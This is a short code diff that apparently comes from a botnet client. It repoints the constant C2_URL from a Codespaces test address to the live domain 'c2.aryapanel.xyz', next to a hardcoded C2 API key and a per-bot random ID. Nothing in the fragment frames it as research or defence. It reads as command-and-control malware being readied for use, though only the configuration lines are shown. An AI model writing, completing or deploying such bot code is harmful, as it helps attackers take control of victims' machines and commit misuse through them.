@@ -17,7 +17,7 @@ import { URL } from 'url';
 // ============================================
 // CONFIG
 // ============================================
-const C2_URL = process.argv[2] || 'https://super-duper-waddle-4jwqw567q4x925jj6-8080.app.github.dev';
+const C2_URL = process.argv[2] || 'https://c2.aryapanel.xyz';
 const API_KEY = 'aryzz-c2-api-key-2024';
 const BOT_ID = crypto.randomUUID();
 
